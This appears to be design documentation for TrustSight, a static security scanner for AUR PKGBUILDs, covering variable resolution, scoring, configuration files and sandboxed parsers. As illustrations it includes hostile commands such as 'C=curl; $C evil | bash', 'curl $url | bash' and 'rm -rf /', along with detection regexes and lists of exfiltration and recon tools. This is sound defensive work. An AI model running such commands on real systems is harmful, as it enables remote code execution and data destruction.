<!-- description: Why TrustSight is static by design, how resolution works, how the tokenizer and parser stack are sandboxed, and how recipe-targeted user rules extend the surface. -->

# Static Analysis and Resolution


TrustSight is a static analyser by design. This page covers what that
choice buys, how resolution decides what can and cannot be known, how the
tokenizer and parser stack are isolated from the analysis process, and how
recipe-targeted user rules extend the surface without executing anything.

## Why Static Analysis

TrustSight is a **Static Application Security Testing** (SAST) tool, purpose-built for Arch Linux AUR PKGBUILDs. This page explains why it was designed this way, how the pipeline works, what static analysis can and cannot see, and how you can tune the detection surface.

### Why static analysis

A PKGBUILD is a recipe, not a binary. It declares what the build will fetch, how it will compile, and what it will install. That text is available before `makepkg` runs, which means you can audit it before you build.

The AUR is an unmoderated, user-submitted repository. Anyone can publish, and whoever maintains a package can modify it at will. The strongest realistic adversary controls every byte of every artifact TrustSight reads about a package, and knows the source code. In that environment, TrustSight chose static analysis for four reasons:

1. **It runs before `makepkg`.** The whole point is to decide whether to build. Running the PKGBUILD to inspect it would defeat the purpose: a malicious PKGBUILD could detect execution and behave differently, or perform harmful actions during the attempted resolution.
2. **It is deterministic.** The same diff, against the same stored history, always produces the same score and the same evidence record. There is no randomness, no remote service, and no model in the loop. Runs are read-only by default, so asking twice against the same database does not change the answer; `--record` is the explicit opt-in that makes the next run's history different. (See [Security Model](../security-design/security-model.md) for the full invariant.)
3. **It scales.** Analysing 50 packages in a review takes seconds, not minutes. No chroot, no root, no sandbox setup.
4. **It does not modify your system.** TrustSight never runs `makepkg`, never fetches a URL a package declares, and never extracts an archive to disk. Every finding is traceable to a specific diff line, URL, or novelty record. There is no SSRF primitive to turn a reviewer into a probe. The tool does use the network for two things that are not the package: it downloads the AUR metadata snapshot to discover updates, and (when a baseline is available) the signed seed from the release channel. It never contacts a source the recipe names.

The tradeoff is honest: static analysis cannot observe runtime behaviour. TrustSight's [W-series rules](../rules/unverifiable.md) (W001-W015) flag cases where code runs and the analysis could not read it, as weight-0 unverifiable findings rather than pretending the surface was covered. See [What TrustSight Cannot See](limitations-and-uncertainty.md) for the full ceiling.

### What SAST means here

TrustSight reads the PKGBUILD and its companion files (`.install` hooks, committed Makefiles, and other AUR repository content). It then walks a five-stage pipeline:

1. **Parse** the PKGBUILD into a structured representation.
2. **Analyse** it against pattern rules and context signals.
3. **Score** the findings through an additive model.
4. **Classify** the result into a risk band.
5. **Report** the findings through a template.

Every step is local and deterministic. No PKGBUILD is executed. No URL a package declares is fetched. No archive is extracted. The tool reads, computes, and reports. That is all. The one exception to "no network" is fetching the AUR metadata snapshot (discovery) and the signed baseline seed (priors), neither of which the package controls.

#### 1. Parse

The PKGBUILD is a shell script with named variables, arrays, function calls, and conditional expressions. The parser resolves variable references in `source`, `sha256sums`, `pkgver`, `pkgrel`, and the `package()` function to produce a structured representation.

Resolution is partial by design. PKGBUILDs are not executed, so the parser can only resolve what is statically determinable:

- Simple variable references (`$pkgname`, `${pkgver}`) are resolved.
- Function calls (`pkgver() { ... }`) are parsed for structure but not executed.
- Conditional branches (`if [[ ... ]]`) are noted but not taken.
- Dynamically constructed strings (command substitution, arithmetic expansion) are marked as unresolvable.

When a `source=` entry is computed at build time (a command substitution, not a variable the tokenizer can expand), the URL the build will actually fetch is not in the analysed text. The pipeline records this as the `unresolved_source` coverage gap, and a coverage gap forbids an UNFLAGGED verdict: the result is reported as `Inconclusive` rather than guessing.

The tokenizer also resolves shell variables so that a payload assembled from `C=curl; $C evil | bash` still reaches the rules. Resolution is bounded: `_MAX_EXPANSION_PASSES` (16 rewrites), `_MAX_VALUE_LEN` (8 KiB per value), `_MAX_LINE_LEN` (64 KiB per resolved line), and `_MAX_TABLE_BYTES` (1 MiB for the variable table). A value that would exceed the bound is left unexpanded and never truncated, because a truncated value would look like a fully resolved string with its tail quietly removed. A substitution whose value times its replacement would exceed a line (`${x//a/<large>}`) is refused before allocation, a whole-PKGBUILD resolve is capped at `_MAX_TEXT_LEN` (8 MiB), and a glob is matched by a table pass (bounded by `_MAX_GLOB_PATTERN_LEN` and `_MAX_GLOB_STEPS`) rather than compiled into a backtracking regex. The same bounds live in the shared `expansion.py`, so the parent resolver used for `pkgver` and `source=` obeys them too, not only the sandboxed worker. `${v:+alt}` and `${v:?message}` resolve when `v` is set; an unset `:?` stays unresolved because the shell aborts. Heredoc bodies follow the opener order, so one line with two openers supplies both bodies as data, and `<<<word` opens nothing. Indirect expansion (`${!name}`) and length (`${#name}`) are never resolved; both return unresolved rather than a guess.

#### 2. Analyse

The analysis stage extracts four categories of signal from the parsed PKGBUILD:

**Structural signals (Tier A)** come from rule matching. Two match targets exist because PKGBUILDs have two surfaces:

- **Resolved strings** are the post-resolution values of variables and function bodies. Rules matched against resolved strings (R001, R002, R003, R008, R012) catch patterns that survive variable resolution. For example, `curl $url | bash` is detected in the resolved string after `$url` is expanded, not in the raw diff line where the actual URL is hidden behind a variable.
- **Raw diff lines** are the literal lines changed in the diff, with the `+`/`-` prefix stripped. Rules matched against raw lines (H001, H002, R007, H004, R010, R011, R013) catch patterns in the PKGBUILD text itself: a `sha256sums=('SKIP')` declaration, a `sudo` command, a unicode bidi override character.

Scope constraints further refine matching. R010 (curl) and R011 (wget) are restricted to `function_body` context to avoid firing on top-level variable assignments or informational messages. This was a direct result of corpus analysis: these patterns in comments or messages were high-frequency false positives, while the uses worth reporting occur inside build functions.

**Context signals (Tier B)** classify every new source URL by domain. Classification is deterministic: static configured lists and the homograph check assign each URL to `trusted_forge`, `official`, `raw_hosting`, `unknown`, or `homograph_attack`. The classification makes no network calls; a run's only egress is the AUR metadata snapshot and the signed baseline channel.

**History signals (Tier C)** compare new URLs and maintainers against the local database. A URL that has never been observed before in any package is globally novel; one never seen for this specific package is locally novel. Novelty is definitionally meaningless on first run, so its contribution is maturity-gated: it phases in linearly as observations accumulate, reaching full weight at 50 observations.

**Verification signals (Tier D)** inspect the statically visible post-diff PKGBUILD text for cryptographic metadata: checksum arrays, PGP key declarations, and GPG verify calls. They are declarations, not database-backed or remote verification: TrustSight does not establish that the declared protection is valid. Everything the tool sees is attacker-declared, and it never fetches, so it cannot confirm that a declared key signs anything. These signals are reported at weight 0.

Rule patterns are regexes running over attacker-written text, so the input is clamped to 8 KiB per line before matching. A diff containing any over-length line records the `line_truncated` coverage gap, which forbids an UNFLAGGED result. The diff itself is capped at a configured byte limit (default 5 MiB); reaching it records `diff_truncated`.

#### 3. Score

The score is a single integer from 0 to 100 computed from all signals. The calculation is **purely additive**: nothing lowers a score.

Each severity level carries a weight reflecting its information value:

| Severity | Weight | Meaning |
|----------|--------|---------|
| FATAL | 0 | Active deception of the reviewer (R012, R013); names itself in the verdict label, e.g. `Low (FATAL: R012)` |
| CRITICAL | 40 | Almost certainly malicious if triggered |
| HIGH | 25 | Strong signal |
| MEDIUM | 15 | Notable but not definitive |
| LOW | 5 | Weak signal, context-dependent |
| INFO | 0 | Recorded for audit only |

FATAL rules (R012, R013) contribute weight 0 like any other finding; the score is the strict sum of weights and does not jump to 100 when one fires. The FATAL signal rides the verdict label (`Low (FATAL: R012)`) and the unsuppressible FATAL entry in `score_breakdown`. A CRITICAL finding floors the risk band at High: a lone fork bomb or `rm -rf /` would otherwise read as Medium on arithmetic that says nothing about severity.

Source bucket modifiers adjust for domain trustworthiness: `unknown` adds 20, `homograph_attack` adds 30, `trusted_forge` and `official` add 0. Novelty weights add to the score when maturity allows: `url_first_globally` adds 10, `url_first_in_package` adds 5, `maintainer_first_in_package` adds 15, each scaled by `min(1, observations/50)`.

The final score is clamped to 0 to 100. A package with checksums, a trusted forge source, and no rule firings scores 0.

#### 4. Classify

The score maps to a verdict class:

| Score range | Verdict | Meaning |
|-------------|---------|---------|
| 0 to 20 | Low | No actionable signals detected, and the analysis was complete |
| 21 to 50 | Medium | Signals warrant review before updating |
| 51 to 80 | High | Strong signals warrant review |
| 81 to 100 | Critical | Almost certainly malicious if triggered |
| Any | Inconclusive | A cold database, or an analysis that could not examine the whole change |

INCONCLUSIVE is triggered by exactly two things: a coverage gap (the diff was truncated, a line was longer than the matching limit, or a `source=` entry is computed at build time), or a cold database (a Medium-band score held up entirely by novelty, with fewer than 25 recorded analyses). A HIGH, CRITICAL, or FATAL finding is never downgraded this way.

#### 5. Translate

The score, evidence breakdown, and verification metadata are rendered into a structured report. All output is deterministic and generated locally from the computed data. No language model renders a verdict; rendering is a security property, not a stylistic one.

### What static analysis cannot see

Static analysis has a reasoned ceiling. These are not bugs; they are inherent limits of auditing PKGBUILD metadata rather than build artifacts.

#### The upstream-payload gap

A PKGBUILD is a recipe, not a meal. A signed, version-bumped PKGBUILD with a checksum that matches a backdoored tarball is invisible to this tool. The audit checks the recipe, not the cooked meal. TrustSight can tell you that the recipe looks normal; it cannot tell you that the tarball at the other end of that checksum is safe.

A checksum, a commit, a submodule gitlink, and a committed binary's blob id all name content the analysis never reads. A change to one of them, with no corresponding version change, is the observable form of "the code was replaced". H033 applies this to a git ref and C001 to a checksum. What remains genuinely invisible is a first analysis (which has no previous identity to compare against) and a legitimate upstream release that happens to contain a payload.

#### The parser boundary

Not all PKGBUILD structure is resolvable without execution. Unresolvable variable references, conditional expressions that determine command execution, dynamically constructed command strings, and loop-generated sources are all beyond static resolution. Where this affects a `source=` entry, the pipeline records the `unresolved_source` coverage gap and the run is reported as `Inconclusive`.

#### Deliberately-unremarkable PKGBUILDs

A malicious PKGBUILD that contains no detectable patterns (no `curl`, no `base64`, no checksum changes, no new URLs, no untrusted source buckets) will score 0. The tool detects patterns associated with compromise, not compromise itself. TrustSight mitigates this through novelty signals (Tier C catches patterns the rules do not anticipate), the additive scoring model (low scores still warrant review), and deterministic verdicts (every triggered signal is described). None of these eliminate the problem.

#### The novelty ceiling

The ruleset detects known patterns and reuse: commands, hosts, checksums, maintainers, and dependency names that match a documented signature or have been observed before. An attacker with fresh infrastructure and no known pattern is not caught by most rules.

For the full list of limitations, see [What TrustSight Cannot See](limitations-and-uncertainty.md).

### Customization

TrustSight's configurable detection surface is controlled through files in `~/.config/trustsight/`, without touching source code. The files are written on first run; an edited file is always kept, and `ensure_default_configs()` appends any shipped rules a stale `rules.toml` is missing. A `trustsight config sync-rules` command brings a stale `rules.toml` in line with the shipped defaults.

#### rules.toml

The primary tuning surface. Contains 37 R-series regex rules, each with an `id`, `name`, `pattern`, `severity`, `category`, and `match_target`. You can change the pattern, severity, or disable any of them. Use `weight_override` in `config.toml` to change an R-series rule's weight.

```toml
[[rules]]
id = "R001"
name = "Remote Script Execution"
pattern = 'curl.*(?<!\\\\)\\|\\s*(?:@@EXEC@@)'
severity = "CRITICAL"
category = "network_execution"
match_target = "resolved"
```

R-series rules are regex-based and match against resolved strings or raw diff lines. H-series heuristics (103 rules) are emitted from code because they need diff context a single-line regex cannot see (for example, "did the build function change between two commits?", or "did the build function gain a network client?"). Their thresholds are tuned in `thresholds.toml`, and their weights come from `[severity_weights]` in `config.toml`.

C-series rules (C001-C035) enforce structural invariants that depend on comparing multiple parsed fields (checksum state, source URL set, pkgver value). They are hard-coded because writing them as TOML patterns would require embedding logic in regex.

S-series sabotage rules (S001-S008) use command-position matching to distinguish build-sandbox cleanup from system damage: `rm -rf "$srcdir/x"` is housekeeping, `rm -rf /` is not.

X-series crossfire rules (X001-X034) are anti-evasion rules that detect patterns designed to exploit the analysis itself.

Two families report at weight 0 and never score: declared-practice findings (P001-P009) and [unverifiable findings (W001-W015)](../rules/unverifiable.md), the latter naming what an analysis could not read.

For the full rule catalog, see [Rules Reference](../rules/index.md).

#### config.toml

Controls weights, limits, review profiles, and per-rule overrides.

**`[severity_weights]`** maps each severity level to its numeric contribution to the base score. FATAL findings contribute their declared weight (0 by default) like any other finding; the FATAL signal rides the verdict label and the unsuppressible `score_breakdown` entry, not a score shortcut.

```toml
[severity_weights]
FATAL = 0
CRITICAL = 40
HIGH = 25
MEDIUM = 15
LOW = 5
INFO = 0
```

**`[review]`** selects a profile and its flagging threshold. Three profiles ship: `default` (threshold 20, about 6.3% of benign diffs enter the review queue), `quiet` (threshold 40, smaller queue), and `strict` (threshold 10, broader queue for operators who prefer sensitivity). Changing a profile does not change a score, risk band, or calibration result; it changes only the reports marked for review.

```toml
[review]
profile = "default"
```

**`[rules.R###]`** provides per-rule `enabled` and `weight_override` for any R-series rule. A FATAL rule cannot be disabled.

```toml
[rules.R007]
enabled = false
weight_override = 15
```

**`[depth]`** controls how far into AUR dependency closures to analyse. `0` disables it, `1` (the default) analyses direct AUR dependencies, `n` analyses n levels, and `-1` walks every level up to the hard ceilings (8 levels, 200 dependencies per run).

```toml
[depth]
levels = 1
```

**`[diff]`** sets byte caps for diffs. The default `max_diff_bytes` is 5 MiB; a larger diff sets the `diff_truncated` coverage gap.

**`[code_rules]`** enables or disables code-emitted rules that default to `true` after corpus calibration: D001 (novel dependency name), D002 (dependency typo), D003 (network-capable makedepends), D004 (unrelated provides/replaces), H015-H019, and others.

#### overrides.json

Suppress a specific finding for a specific package. Managed through the `trustsight override` command:

```bash
trustsight override add R001 --package some-package --reason "Legitimately bootstraps its own installer"
trustsight override list
trustsight override rm R001 --package some-package
```

A FATAL finding (R012, R013) cannot be overridden. Suppressed findings are always visible in the output as non-scoring audit data; a silent suppression is indistinguishable from a missed one.

#### thresholds.toml

Tuning knobs for H-series heuristics and longitudinal signals. Each key controls a threshold that a code-emitted rule reads at analysis time:

| Key | Rule | Default | Meaning |
|-----|------|---------|---------|
| `h036.obfuscation_density` | H036 | 3 | Distinct obfuscation indicators on one line before reporting |
| `h043.attack_chain_stages` | H043 | 3 | Kill-chain stages that must co-occur |
| `h045.min_packages` / `h045.window_days` | H045 | 10 / 7 | Cluster size and window for mass adoption detection |
| `h052.min_packages` | H052 | 3 | Unrelated packages that must share a source repository |
| `h055.min_packages` / `h055.window_hours` | H055 | 5 / 24 | Cluster size and window for an attribute burst |
| `h057.min_hops` / `h060.min_hops` | H057, H060 | 2 | Hops that make an exposure transitive rather than direct |
| `h058.min_history_cycles` / `h058.z_score` / `h058.min_activity` | H058 | 3 / 2.0 / 3 | Baseline length, deviation, and floor for maintainer activity |
| `h061.min_dependents` | H061 | 50 | Dependents that make a package a hub |
| `h073.min_history_cycles` / `h073.z_score` / `h073.min_introduced` | H073 | 3 / 3.0 / 3 | Baseline length, deviation, and floor for corpus introduction rate |
| `h064.widely_provided_observations` | H064 | 25 | Observations that make a provided name widely provided |
| `h074.window_days` | H074 | 14 | How recent the modification must be after an adoption |
| `longitudinal.stability_floor` | Class C | 10 | Consecutive observations a property must hold before a change is reported |

#### hosts.toml

Lists that rules match against. Each list is consumed directly by its named rule:

| Key | Rules | Contents |
|-----|-------|----------|
| `paste_hosts` | H041, source buckets | Paste and ephemeral file-drop hosts. As `source=` URLs they are weighted by the `raw_hosting` bucket; as upload destinations inside a function they trigger H041. |
| `standard_ports` | R047 | Ports a build may legitimately contact. An HTTP URL to a non-standard port triggers R047 unless the port is in this list. |
| `free_registrar_tlds` | R048 | TLDs available at no cost, where a throwaway domain is cheap. |
| `source_schemes` | H034 | Allowlisted `source=` schemes. The base of a `transport+base` token is judged, so `git+https` reads as `https`. |
| `confusable_domains` | R013b | Popular domains a homoglyph label is tested against. A mixed-script label that resembles none of them stays quiet. |
| `covert_egress_endpoints` | H071 | DNS-over-HTTPS endpoints. |
| `covert_egress_clients` | H071 | Tunnelling and proxy clients, matched only at a command position. |

For overlapping settings, `hosts.toml` has precedence: `standard_ports` overrides `[ports] standard` in `config.toml`, and `free_registrar_tlds` overrides `[domains] free_registrar_tlds`. An empty sibling list falls back to the corresponding `config.toml` value and then the shipped default.

#### patterns.toml

Pattern lists for specific rules:

| Key | Rules | Contents |
|-----|-------|----------|
| `foreign_pkg_managers` | H035 | Package managers that are not pacman. |
| `obfuscation_indicators` | H036 | Per-line obfuscation markers, counted against a density threshold. |
| `anti_analysis_probes` | H067 | Debugger, VM, sandbox, and CI probes. |
| `recon_commands` | H040 | Host-profiling commands, command-position anchored. |
| `parse_time_fetch` | H077 | Network clients whose invocation outside every function runs when the recipe is sourced. |
| `upload_flags` | H041 | `curl`/`wget` flags that send a request body (separating an upload from a download). |
| `network_tools` | D003 | Package names that grant a build network access. |
| `security_relevant_flags` | H047 | Hardening flags whose appearance or disappearance changes the mitigation set. |
| `security_relevant_libraries` | H048 | Libraries whose vendoring bypasses distribution security updates. |

#### naming.toml

Ecosystem prefixes (D004, H064) and variant suffixes (D002, H029, H052, H053). These decide when two package names belong to the same project, which is what keeps a package claiming its own project's names from firing a scope-expansion rule. For example, `htop-vim` providing `htop` does not fire D004 because the suffix identifies it as a variant.

#### trusted_domains.toml

Domain classification lists for source bucket assignment: `trusted_forges` (github.com, gitlab.com, codeberg.org, bitbucket.org), `official_projects` (downloads.apache.org, nginx.org, kernel.org, and others), and additional categories. A URL's bucket determines its score modifier: `trusted_forge` and `official` add 0, `raw_hosting` adds 15, `unknown` adds 20, `homograph_attack` adds 30.

#### iocs.toml

A versioned indicator list of known-bad package names, domains, and artifact hashes, each with provenance and a confidence tier. Ships empty. Matches are emitted as `H056` findings and scored: the confidence tier sets the severity, so `confirmed` is FATAL, `high` is CRITICAL and `medium` is HIGH. A confirmed FATAL match contributes weight 0 like any other finding and names itself in the verdict label; the FATAL entry in `score_breakdown` is the do-not-install signal. (The separate IOC federation baseline is reported on `PackageFact.ioc_matches` without affecting the score.) An expired indicator is reported as expired rather than silently dropped.

---

For the full configuration reference, see [Configuration](../reference/configuration.md). For the scoring model, see [Scoring Philosophy](scoring-and-verdicts.md). For the security invariants, see [Security Model](../security-design/security-model.md).

## Sandboxing the Tokenizer

The tokenizer runs in a separate process. This page is why, what the
isolation does and does not buy, and why the other candidate evolution -
a subprocess-isolated renderer - was left alone. It began as a design note
and is now a description of something that exists; the [security
model](../security-design/security-boundaries.md#the-invariants) states the
invariant (A6) and `scripts/security_gates.py` enforces it.

### Why this component

The model's largest stated gap is architectural: a tool whose entire job is
reading untrusted text parses, renders and stores that text through
third-party code it does not audit. Two candidates were named for shrinking
that surface. They were not equally worth doing, and the tokenizer won.

The tokenizer is the second parser eating hostile input, and it is the one
with an amplification property the regex engine does not have. [A6](../security-design/security-boundaries.md#the-invariants)
describes it: `b=$a$a` doubles per level, and a chain grows as `2**depth`,
so a 517-byte PKGBUILD was once enough to exhaust memory unbounded. Four
bounds hold it (`_MAX_EXPANSION_PASSES`, `_MAX_VALUE_LEN`, `_MAX_LINE_LEN`,
`_MAX_TABLE_BYTES`) and they are effective; a substitution that would
multiply a value by its replacement is refused before `re.sub`, and a glob
is answered by a table pass bounded by `_MAX_GLOB_PATTERN_LEN` and
`_MAX_GLOB_STEPS`, never compiled into a backtracking regex. They live in
the shared `expansion.py`, so the parent's whole-PKGBUILD resolver obeys
the same values as the worker. But a bound found and applied to a known
amplification is a different assurance from "a defect here cannot reach
anything", and that is the gap isolation closes.

It also happens to be the component where isolation is a bounded project
rather than a rewrite:

- **It is self-contained.** One module, no network, no database, no
  filesystem. Its contract is a pure function: text in, resolved text and a
  set of unresolved markers out.
- **It is already fuzzed.** `tests/test_tokenizer_fuzz.py` and the
  `tokenizer hostile-input smoke is deterministic` gate characterise the
  behaviour that has to survive the boundary.
- **Its output is data, not objects.** Nothing downstream needs a live
  Python object from it, so a serialisation boundary costs little.

The renderer fails all three. It is `rich`, it is interleaved with terminal
state, and its output *is* the side effect. [A10](../security-design/security-boundaries.md#the-invariants)
already bounds the thing that matters there: package-controlled text passes
through `safe_text.clean` and `safe_markup` before it reaches a console. So
the renderer stays where it is.

### What isolation buys

The honest answer is narrower than "the tokenizer becomes safe".

**It bounds the blast radius of a defect in expansion, not the correctness
of expansion.** A logic bug that resolves `$payload` wrongly is a detection
bug, and it produces a wrong answer inside the sandbox exactly as it does
outside one. What changes is a memory-safety or resource defect: a bound
that turns out to be bypassable, an interpreter-level pathology, an
allocation pattern that survives the four ceilings. Today such a defect has
the whole process. Under isolation it has a subprocess with no descriptors
worth having and `RLIMIT_AS` over its address space.

**It makes a failed parser a refusal, not a quiet run.** This is the part
that fits the model rather than merely hardening it. The parent reaches the
tokenizer only through `trustsight.tokenizer`; the engine is imported by the
worker alone (the `tokenizer module is isolated` gate fails otherwise). A
child that cannot answer raises `TokenizerUnavailable`, and the package is
reported as not vetted through the same path as any other analysis failure,
so a dead sandbox can never read as a clean diff. A response that is not a
frame-shaped object, or that carries neither `result` nor `error`, is
treated the same way. That is strictly more honest than an analysis that
silently ran without its parser.

**It does not remove the Python runtime from the trust boundary.** The
interpreter, the standard library and the OS remain [assumptions](../security-design/security-model.md#assumptions).
A subprocess is the same interpreter with fewer privileges; it is a smaller
target, not a different one. The worker therefore also enters the shared
kernel sandbox in `sandbox/_linux_sandbox.py`: a user namespace, a private
network namespace, a Landlock filesystem ruleset and a seccomp allowlist
with no socket syscalls. Landlock ABI 6 (Linux 6.12+) is required; a kernel
that cannot provide that floor refuses the worker rather than analysing with
weaker confinement. This reuses the same primitives as the git worker, not a
new dependency: Landlock and seccomp are installed directly through
`ctypes`.

### What it costs

- **A process per worker.** The pool starts `WORKER_POOL_SIZE` (4) children and
  recycles each after 512 requests. A fresh interpreter per diff was
  measured at 26-48 ms against a 0.5 ms tokenizer on the locked benign
  corpus, so one-shot spawning was rejected; the pool amortises startup to
  nothing over a run.
- **A serialisation boundary, which is a new parser.** Isolating a parser
  requires a protocol between parent and child, and that protocol reads
  input it did not produce. It is therefore kept trivial: a four-byte
  big-endian length and JSON, never `pickle` (the `no interpreter or shell
  execution` gate forbids unpickling for exactly this reason). Every frame
  is capped, every read is sized, and every write is deadline-bounded.
- **Round-trips, unless they are cached.** The analysis makes ~97
  tokenizer entry-point calls per diff; the identity cache collapses them
  to about a dozen child round-trips, because the same diff object reaches
  many call sites. Without the cache the boundary would dominate the
  analysis.
- **A gate that proves the real path.** Per [reviewing a security
  control](../contributing/security-review.md), the checks exercise the
  path an attacker reaches: one asserts no `src/` module imports the
  engine, and one forces the spawn to fail and proves `scan_diff` raises
  rather than completing.

### Why it was built without a demonstrated bypass

The design note this page grew out of set three conditions for building it,
and none of them was met: no A6 bound has been demonstrated bypassable, the
expansion surface did not grow, and a one-shot child was measured at 26-48 ms
against a 0.5 ms tokenizer, so per-diff spawning was not free. It was built
anyway, as a deliberate choice: the cost is now carried by a persistent pool
and batched per-line ops rather than by the analysis, the failure path is a
refusal rather than a silent degradation, and the invariant is worth having
before a bypass exists rather than after one. The conditions remain the
things to watch if the design is revisited.

### If it changes

Waiting for a busy pool has a five-second deadline. Returning a worker,
retiring one, or shutting down wakes waiting callers; a saturated or stopped
pool raises `TokenizerUnavailable`. Dead idle workers are removed before
replacement, and cleanup closes the child's pipe handles. When a worker's
process group is gone, cleanup falls back to the child process's `kill()`
method. This does not provide Windows pipe polling or Linux resource limits on
Windows.

The request write and the response read share one deadline. The write goes
through `protocol.write_frame`, which puts the descriptor in non-blocking mode
and waits for writability with `select`, so a child that stops reading stdin
cannot hold the parent in a blocking write. Resource-limit setup returns the
limits that could not be applied. A failed `RLIMIT_AS`, `RLIMIT_CPU` or
`PR_SET_NO_NEW_PRIVS` is fatal: the worker exits before serving, and the
client reports the package as not vetted. The remaining limits arrive in
`degraded` and the client logs them once, so a swallowed `setrlimit` cannot
read as full protection. The response is serialised under
`MAX_RESPONSE_BYTES` and framed only if it fits: `protocol.encode_response`
stops at the cap while the body is built, so a wide projection is a contained
`TokenizerUnavailable` refusal rather than a frame the parent reads and
discards. The git worker uses the same encoder. Both workers now run behind the kernel
confinement described in A16: the tokenizer worker is a `read`-role sandbox
with no socket syscalls and no writable filesystem, and the git worker adds
the fetch-role proxy bridge. A missing Landlock ABI 6, seccomp, user
namespace or network namespace is a startup refusal, not a degraded run.

The sandbox covers the whole tokenizer module, so `split_lines` and
`join_line_continuations` are sandboxed too, not only the expansion
functions that carry the amplification risk. The per-line helpers
(`strip_leading_bom`, `collapse_traversal`) are applied in bulk by a single
op for the same reason: routing them per line would be one round-trip per
line. If the tokenizer grows arithmetic or brace expansion, the
amplification analysis has to be redone, and the bounds are then harder to
reason about than four constants; the sandbox means that work can proceed
without the analysis process as the blast radius.

## Sandboxing the Parser Stack

The tokenizer was the first hostile parser isolated because expansion has an
amplification property. The committed dependency manifests have a different
problem: they are parsed by third-party code that this project consumes but
does not audit. A YAML, XML or TOML parser defect is not a detection issue;
it is a defect in the machine running the review.

### What moved

`yaml`, `xml.etree.ElementTree`, `tomllib`, `configparser`, `json`/JSONC and
the manifest format extractors now run in `sandbox/manifest_worker.py`, a
read-role worker launched by `sandbox/manifest_client.py`. The parent sends
`(path, text)` over the framed protocol and receives a serialised
`ManifestDoc`; it never calls the loaders on package-controlled bytes.

The worker is already a Linux sandbox before the first request:

- unprivileged user namespace, private network namespace;
- Landlock filesystem rules (ABI 6 required), no writable path;
- seccomp allowlist with no socket or `execve`/`fork`;
- `RLIMIT_AS`/`RLIMIT_CPU`, `PR_SET_NO_NEW_PRIVS`, no capabilities.

A worker that cannot apply that floor refuses to serve. The client turns a
dead, timed-out or over-cap worker into a named refusal; the manifest layer
records a coverage gap, never a clean result. The client also stops a worker
that times out or replies with an invalid frame, bounds the parse cache by
bytes, refuses a snapshot above the framed-request cap, and resets inherited
worker state after ``fork``.

The worker also owns the analysis tokenizer and the AUR snapshot archive.
`trustsight.tokenizer` sends engine operations to the same content worker, so
the analysis path has no second tokenizer child and no nested sandbox to
spawn. `full_aur/fetch.py` downloads the snapshot, then sends the bytes to
the worker; `analysis/archive_snapshot.py` walks the tar and applies the
member/total bounds there. The parent never opens the archive. The worker
uses the tokenizer **engine** in-process; `sandbox/tokenizer_ops.py` is the
shared dispatch table, imported by the content worker and by the standalone
`expand_worker` used only by the tokenizer sandbox tests.

### Why not just `safe_load`

`yaml.safe_load` is still the loader, but safe loading does not bound
resources. PyYAML 6.0.3 is the latest release and does not contain the
merge-key fan-out fix; that fix is carried in
`analysis/manifest_syntax.py` as a bounded `SafeLoader` subclass, with
explicit node, alias, depth, merge-entry and duplicate-key limits. The
manifest worker is the second layer: even a parser defect spends the worker,
not the analysis process, its database handle or its filesystem.

### What it does not protect

The kernel, the Python interpreter and the parser libraries remain trusted.
The sandbox contains a defect; it does not prove the parser correct. The
worker can still be killed by its own resource limits, which is reported as
a refusal rather than a quiet analysis. The TOML/INI/JSON parsers are pure
Python; the C surfaces in this path are expat (XML) and the JSON accelerator,
and the whole path is below the same trusted-dependency boundary as the rest
of the tool.

## Recipe-Targeted User Rules

A line regex cannot see structure. "A source array gained an entry whose host
matches X" is the natural way to describe a supply-chain move, and no R-series
pattern states it cleanly: the array may be formatted across lines, the same
text may sit in a comment, and an edit that keeps an entry but rewrites its
line matches or not depending on whitespace. The typed core exists to make
that question structural, and this page defines a second rule kind that asks
it directly. The kind ships with zero rules and is an operator surface, not a
shipped detection family.

### The surface

Structural rules live in `rules.toml` in their own top-level array, beside
the R-series `[[rules]]` entries:

```toml
[[structural]]
id = "R900"
field = "source"
match = "host_added"
pattern = "^(.*\\.)?example\\.com$"
severity = "MEDIUM"
```

| Field | Type | Description |
|-------|------|-------------|
| `id` | `string` | **Required.** Rule identifier; `lint-rules` warns when it does not follow the `R###` convention and errors when it names a rule the code already emits. |
| `field` | `string` | **Required.** An array name (`source`, `depends`, `sha256sums`) or `scalars.` plus a scalar name (`scalars.install`). |
| `match` | `string` | **Required.** One of the five primitives below. |
| `pattern` | `string` | **Required.** Python regex searched against the value the primitive selects, never against a raw line. |
| `severity` | `string` | Optional, defaults to `MEDIUM`. `FATAL` and `CRITICAL` clamp to `HIGH`. |
| `name` | `string` | Optional, defaults to the id. |
| `category` | `string` | Optional, defaults to `structural`. |

An entry missing any required field is skipped at load and logged; `lint-rules`
reports the same condition as an error.

`[rules.R###]` controls in `config.toml` (`enabled`, `weight_override`) apply
to a structural entry exactly as they do to a line rule. A rule refused by the
pattern gate is skipped and logged, and `trustsight lint-rules` reports the
same condition as an error.

### Matching values, not lines

The pattern is searched, not matched in full, against the value the primitive
selects: an array entry, an extracted host, a scalar value, or a local name.
It never sees a diff line, so a `#` comment, a `pkgdesc` string or a
`sha256sums` hash cannot satisfy a rule aimed at a source entry unless the
primitive selected it.

Compilation goes through the same gate as an R-series rule (`src/trustsight/rules/`): a
nested quantifier, a probe over the backtracking budget, or superlinear cost
growth refuses the pattern. Matching is case-insensitive, like the R-series.

### What a partial diff means

A diff shows hunks, not files, and the pre and post recipes reconstructed
from it are partial documents. Parsing a partial array is not safe on its own:
the tokenizer returns the entries it can see for an array whose closing
parenthesis sits outside the hunk, and a rule comparing those entries with
the post state would call every invisible old entry newly added. The rule is
changed-line anchored instead.

An entry is **gained** only when `array_diff(pre, post)` reports it gained
AND the diff carries it on an added line. It is **lost** only when the diff
carries it on a removed line. The delta is a multiset: an entry added twice
counts twice and a duplicate removal is a loss, so multiplicity is never
silently dropped. An unchanged entry appears on an added line
only when its line was rewritten, and then the removed counterpart is in the
pre state, so it is not reported as gained. An entry the diff never shows at
all cannot be reported in either direction, which is the intended silence:
the diff is the evidence, and it does not contain the claim.

When the post-state text is available (the review path reads the head
PKGBUILD, the corpus path reads the new one), the post array is complete by
construction; the changed-line anchor still applies, so a rule reports the
edit the diff shows and not the array's whole history.

### Primitives

| `match` | `field` | Fires when | Pattern sees |
|---------|---------|------------|--------------|
| `entry_added` | array | an entry is gained and appears on an added line | the entry literal |
| `entry_removed` | array | an entry is lost and appears on a removed line | the entry literal |
| `host_added` | array | a gained entry on an added line yields a host | the extracted host |
| `scalar_changed` | `scalars.x` | both sides resolve `x` and the values differ | the new value |
| `renamed` | source array | a URL visible on both sides keeps the URL and changes its local name | the new local name |

A `field` the recipe does not carry never matches; an array name with an
architecture suffix (`source_x86_64`) works the same as its base. `host_added`
